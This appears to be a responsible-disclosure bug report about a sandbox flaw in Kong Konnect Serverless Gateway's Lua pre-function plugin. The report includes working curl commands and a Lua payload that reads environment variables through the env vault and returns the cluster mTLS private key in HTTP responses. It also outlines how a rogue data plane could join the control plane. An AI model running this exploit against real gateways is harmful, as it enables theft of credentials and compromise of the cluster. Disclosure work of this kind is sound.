## Summary

Kong Konnect Serverless Gateway allows authenticated tenants to attach a `pre-function` plugin that executes arbitrary Lua code on the shared gateway infrastructure.

Due to incomplete sandboxing, the Lua environment has access to `kong.vault.get()` and the built‑in `env` vault backend. Any tenant with plugin‑management rights can read **any environment variable**, including:

- `KONG_CLUSTER_CERT`
- `KONG_CLUSTER_CERT_KEY` (cluster mTLS private key)

I used this to exfiltrate the cluster private key and demonstrate that an attacker can connect a rogue data plane to the victim’s control plane.

---

## Endpoints

Control plane API (Serverless Gateway configuration):

- `https://eu.api.konghq.com/v2/control-planes/<CP_ID>/core-entities/plugins`

Public Serverless Gateway proxy:

- `https://kong-<gateway_id>.kongcloud.dev/test`

All testing was done only against my own Konnect organization and Serverless Gateway instance.

---

## Steps To Reproduce:

1. **Prepare Konnect account and variables**

   ```bash
   export TOKEN="<YOUR_JWT_OR_PAT>"
   export CP_ID="<YOUR_CONTROL_PLANE_ID>"
   export PROXY_URL="https://kong-<gateway_id>.kongcloud.dev"
   export API_URL="https://eu.api.konghq.com/v2/control-planes/${CP_ID}/core-entities"
   ```

2. **(Optional) Delete any existing `pre-function` plugin**

   ```bash
   PLUGIN_ID=$(curl -s "${API_URL}/plugins" \
     -H "Authorization: Bearer ${TOKEN}" | \
     grep -o '"id":"[^\"]*","name":"pre-function"' | \
     grep -o '"id":"[^\"]*"' | \
     cut -d'"' -f4)

   if [ -n "$PLUGIN_ID" ]; then
     curl -s -X DELETE "${API_URL}/plugins/${PLUGIN_ID}" \
       -H "Authorization: Bearer ${TOKEN}"
   fi
   ```

3. **Create malicious `pre-function` plugin that calls `kong.vault.get("{vault://env/...}")`**

   ```bash
   curl -s -X POST "${API_URL}/plugins" \
     -H "Authorization: Bearer ${TOKEN}" \
     -H "Content-Type: application/json" \
     -d '{
       "name": "pre-function",
       "config": {
         "access": [
           "local out={\"ENV_VAULT_EXFIL\"}; local vars={\"PATH\",\"HOME\",\"KONG_PREFIX\",\"KONG_DATABASE\",\"KONG_CLUSTER_CERT\",\"KONG_CLUSTER_CERT_KEY\"}; for _,v in ipairs(vars) do local ref=\"{vault://env/\"..v..\"}\"; local ok,val=pcall(kong.vault.get, ref); out[#out+1]=v..\" = \"..tostring(val) end; kong.response.exit(200, table.concat(out, \"\\n\"))"
         ]
       },
       "enabled": true
     }'
   ```

4. **Wait for propagation**

   ```bash
   sleep 15
   ```

5. **Trigger the payload via the public gateway**

   ```bash
   curl -s "${PROXY_URL}/test"
   ```

   **Actual response (redacted):**

   ```text
   ENV_VAULT_EXFIL
   PATH = /usr/local/sbin:...
   HOME = /root
   KONG_PREFIX = /usr/local/kong
   KONG_DATABASE = off
   KONG_CLUSTER_CERT = <BASE64_CERT_REDACTED>
   KONG_CLUSTER_CERT_KEY = <BASE64_PRIVATE_KEY_REDACTED>
   ```

   At this point the cluster certificate and private key of the Konnect Serverless cluster are fully exfiltrated from environment variables.

6. **(Optional) Decode keys and connect a rogue data plane**

   Decode the base64 values into `cluster.crt` and `cluster.key` and start a Kong data plane container that uses these credentials to join the victim control plane. I did not route any real third‑party traffic through this rogue data plane; this step is provided as an attack scenario only.

---

## Supporting Material/References:

- `EXPLOITATION_COMMANDS_SANITIZED.md` – full sanitized exploitation commands.
- `EXPLOITATION_LOGS_SANITIZED.md` – sanitized execution logs showing the cluster private key being exfiltrated.

Full raw logs and original key material are redacted here but can be shared securely with the security team if needed. All sensitive tokens/keys used for testing will be revoked.
